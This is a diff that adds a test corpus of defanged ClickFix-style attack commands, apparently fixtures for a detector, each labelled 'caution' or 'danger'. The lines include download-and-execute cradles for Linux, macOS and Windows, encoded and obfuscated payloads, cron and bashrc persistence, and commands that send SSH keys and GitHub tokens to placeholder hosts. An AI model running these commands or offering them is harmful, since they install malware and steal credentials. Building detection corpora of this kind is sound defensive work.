@@ -1,0 +1,90 @@
+# Defanged ClickFix-style samples modelled on published threat research.
+# Format: <minimum verdict><TAB><command>
+# Rules for this file (enforced by tests/corpus.rs):
+#   * Hosts must be fictitious: reserved TLDs (.example .invalid .test),
+#     documentation IPs (192.0.2.x, 198.51.100.x, 203.0.113.x), or names
+#     starting with "pp-fixture-". Never add real attacker infrastructure.
+#   * Payloads are harmless placeholders. Nothing here is ever executed.
+#   * Escapes: \u{XXXX} stands for a Unicode character. Nothing else is unescaped.
+# --- Linux / macOS: download piped into a shell -------------------------
+caution	curl -fsSL https://update-check.example/u/8f3a | sh
+caution	wget -qO- https://cdn-sync.example/i | bash
+danger	curl -fsSL https://pp-fixture-10.lat/u/8f3a | sh
+danger	curl -sL -d "id=f00d&siteUrl=https%3A%2F%2Fshop.example" "https://script.google.com/macros/s/AKfyFIXTURE/exec" && curl -fsSL "https://pp-fixture-11.lat/u/8f3a" | sh
+danger	(curl -fsSL https://pp-fixture-12.space/u/1 || curl -fsSL https://pp-fixture-12.icu/u/1) | sh
+danger	curl -s http://198.51.100.14/a.sh | bash
+danger	curl -s http://203.0.113.77:8080/x | sudo bash
+danger	wget -qO- https://bit.ly/pp-fixture | sh
+danger	curl -fsSL https://xn--pple-43d.example/i | sh
+danger	curl -fsSL https://pp-fixture-13.trycloudflare.com/i | sh
+danger	curl -fsSL https://transfer.sh/pp-fixture/i.sh | bash
+danger	nohup bash -c 'curl -fsSL https://update.example/a | sh' >/dev/null 2>&1 &
+danger	curl -fsSL https://update.example/a | sh                                                                # Cloudflare verification ID 2841
+danger	setsid sh -c "$(curl -fsSL https://pp-fixture-14.top/p)" &
+# --- substitution / process substitution --------------------------------
+caution	/bin/bash -c "$(curl -fsSL https://update.example/install.sh)"
+danger	/bin/zsh -c "$(curl -fsSL https://pp-fixture-15.cfd/m)"
+danger	bash <(curl -s http://192.0.2.44/x)
+danger	eval "$(wget -qO- https://pp-fixture-16.sbs/a)"
+danger	source <(curl -s https://pp-fixture-17.xyz/env)
+# --- encoded payloads ---------------------------------------------------
+danger	echo Y3VybCAtZnNTTCBodHRwczovL3VwZGF0ZS5leGFtcGxlL2EgfCBzaA== | base64 -d | bash
+danger	echo "Y3VybCAtZnNTTCBodHRwczovL3VwZGF0ZS5leGFtcGxlL2EgfCBzaA==" | base64 --decode | sh
+danger	echo Y3VybCAtZnNTTCBodHRwczovL3VwZGF0ZS5leGFtcGxlL2EgfCBzaA== | base64 -D | zsh
+danger	bash -c "$(echo Y3VybCAtZnNTTCBodHRwczovL3VwZGF0ZS5leGFtcGxlL2EgfCBzaA== | base64 -d)"
+danger	eval "$(echo Y3VybCAtZnNTTCBodHRwczovL3VwZGF0ZS5leGFtcGxlL2EgfCBzaA== | base64 -d)"
+danger	base64 -d <<< Y3VybCAtZnNTTCBodHRwczovL3VwZGF0ZS5leGFtcGxlL2EgfCBzaA== | bash
+danger	printf '\x63\x75\x72\x6c\x20\x2d\x73\x20\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x70\x64\x61\x74\x65\x2e\x65\x78\x61\x6d\x70\x6c\x65\x20\x7c\x20\x73\x68' | sh
+danger	python3 -c "import urllib.request as u;exec(u.urlopen('https://pp-fixture-18.lat/p').read())"
+danger	python3 -c "import base64;exec(base64.b64decode('aW1wb3J0IG9zO29zLnN5c3RlbSgnY3VybCAtcyBodHRwczovL3VwZGF0ZS5leGFtcGxlIHwgc2gnKQ=='))"
+danger	node -e "require('https').get('https://pp-fixture-19.top/a',r=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>eval(d))})"
+danger	perl -e 'use LWP::Simple;eval(get("https://pp-fixture-20.icu/p"))'
+# --- download, then run -------------------------------------------------
+danger	curl -o /tmp/.u https://pp-fixture-21.lat/u && chmod +x /tmp/.u && /tmp/.u
+danger	wget -q https://pp-fixture-22.xyz/update.sh -O /tmp/update.sh && bash /tmp/update.sh &
+danger	cd /tmp && curl -O http://203.0.113.5/agent && chmod +x agent && ./agent
+# --- macOS --------------------------------------------------------------
+danger	osascript -e 'do shell script "curl -fsSL https://pp-fixture-23.lat/m | sh"'
+danger	curl -o /tmp/u https://pp-fixture-24.top/u && xattr -c /tmp/u && chmod +x /tmp/u && /tmp/u
+danger	echo "Y3VybCAtZnNTTCBodHRwczovL3VwZGF0ZS5leGFtcGxlL2EgfCBzaA==" | base64 -D | bash
+# --- persistence and exfiltration ---------------------------------------
+danger	(crontab -l 2>/dev/null; echo "*/10 * * * * curl -fsSL https://update.example/a | sh") | crontab -
+danger	echo 'curl -fsSL https://update.example/a | sh' >> ~/.bashrc
+danger	printf '[Desktop Entry]\nType=Application\nExec=sh -c "curl -s https://update.example/a | sh"\n' > ~/.config/autostart/update.desktop
+danger	curl -F "f=@$HOME/.ssh/id_ed25519" https://collect.example/u
+danger	tar czf - ~/.ssh | curl -T - https://collect.example/u ; curl -s https://update.example/a | sh
+danger	curl --data-binary @$HOME/.config/gh/hosts.yml https://collect.example/u
+danger	nc 203.0.113.50 4444 < ~/.ssh/id_rsa
+# --- hiding tricks ------------------------------------------------------
+danger	curl -fsSL https://update.example/a \u{FF5C} sh
+danger	cu\u{200B}rl -fsSL https://update.example/a | sh
+danger	c\url -fsSL https://update.example/a | sh
+danger	c"ur"l -fsSL https://update.example/a | s"h"
+danger	$'\x63\x75\x72\x6c' -fsSL https://update.example/a | sh
+danger	a=cu;b=rl;$a$b -fsSL https://update.example/a | sh
+danger	curl${IFS}-fsSL${IFS}https://update.example/a|sh
+# --- Windows Run dialog / PowerShell ------------------------------------
+danger	powershell -w h -c "iex(irm https://pp-fixture-30.lat/v)"
+danger	powershell -WindowStyle Hidden -Command "iwr https://update.example/a -UseBasicParsing | iex"
+danger	powershell -nop -w hidden -enc aQBlAHgAKABpAHIAbQAgAGgAdAB0AHAAcwA6AC8ALwB1AHAAZABhAHQAZQAuAGUAeABhAG0AcABsAGUALwBhACkA
+caution	powershell -c "iex (New-Object Net.WebClient).DownloadString('https://update.example/a')"
+danger	powershell -c "$u='ht'+'tps://upd'+'ate.example/a';iex(iwr $u -UseBasicParsing)"
+danger	powershell -c "&(gcm i*x)((New-Object Net.WebClient).DownloadString('https://update.example/a'))"
+danger	powershell -c "[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('aQBlAHgAKABpAHIAbQAgAGgAdAB0AHAAcwA6AC8ALwB1AHAAZABhAHQAZQAuAGUAeABhAG0AcABsAGUALwBhACkA'))|iex"
+danger	mshta https://pp-fixture-31.icu/verify # \u{2705} ''I am not a robot - reCAPTCHA Verification ID: 7731''
+danger	mshta.exe http://198.51.100.61/x.hta
+danger	msiexec /i https://pp-fixture-32.top/update.msi /qn
+danger	msiexec /q /i http://203.0.113.20/a.msi
+danger	rundll32 \\pp-fixture-33.example@SSL\DavWWWRoot\a.dll,Entry
+danger	regsvr32 /s /n /u /i:https://pp-fixture-34.lat/a.sct scrobj.dll
+danger	certutil -urlcache -split -f https://update.example/a.exe %TEMP%\a.exe && %TEMP%\a.exe
+danger	bitsadmin /transfer j /download /priority high https://update.example/a.exe %TEMP%\a.exe
+danger	cmd /c "start /min powershell -w h -c iex(irm https://update.example/a)"
+danger	cmd /c c^u^r^l -s https://update.example/a -o %TEMP%\a.bat ^&^& %TEMP%\a.bat
+danger	conhost --headless powershell -c "iex(irm https://update.example/a)"
+danger	finger fixture@pp-fixture-35.example | cmd
+danger	nslookup -q=txt pp-fixture-36.example 192.0.2.53 | findstr "^cmd" | cmd
+danger	powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true; iex(irm https://update.example/a)"
+danger	powershell.exe -c ping update.example                                                                                    # C:\\Company\\Shared\\HR-Policy.docx
+caution	powershell -c "irm https://update.example/a | iex"
+danger	powershell -c "irm https://pp-fixture-37.lat/a | iex"
